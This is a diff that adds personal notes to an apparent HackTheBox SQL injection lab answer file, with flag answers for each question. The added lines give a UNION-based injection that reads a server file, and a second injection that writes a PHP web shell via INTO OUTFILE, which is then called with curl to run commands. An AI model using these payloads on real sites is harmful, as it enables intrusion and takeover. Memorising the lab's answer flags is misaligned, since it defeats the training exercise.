@@ -213,3 +213,18 @@ ANSWER flag10: HTB{y37_4n07h3r_r4nd0m1z3}
 TRUE/FALSE: id=1 AND 1=1 (1 row) / id=1 AND 1=2 (0 rows)
 Leak: id=1 AND (select content from flag11)=0x<hex>  -> 1 row (true)
 ANSWER flag11: HTB{5p3c14l_ch4r5_n0_m0r3}
+
+---
+# SQLMap Essentials - OS Exploitation (target 154.57.164.77:30833)
+App: GET id injectable, 6 cols, UNION works. DB user = root@localhost, secure_file_priv empty.
+
+## Q1 - read /var/www/html/flag.txt
+  id=0 union select 1,2,3,4,5,load_file(0x<hex of path>)
+ANSWER: HTB{5up3r_u53r5_4r3_p0w3rful!}
+
+## Q2 - OS shell -> find another flag
+Wrote webshell via UNION ... INTO OUTFILE:
+  id=0 union select 1,2,3,4,5,0x<hex of "<?php system($_GET['cmd']); ?>"> into outfile '/var/www/html/sh.php'
+  curl '.../sh.php?cmd=id'  -> uid=33(www-data)
+  cat /flag.txt -> HTB{n3v3r_run_db_45_db4}
+ANSWER: HTB{n3v3r_run_db_45_db4}
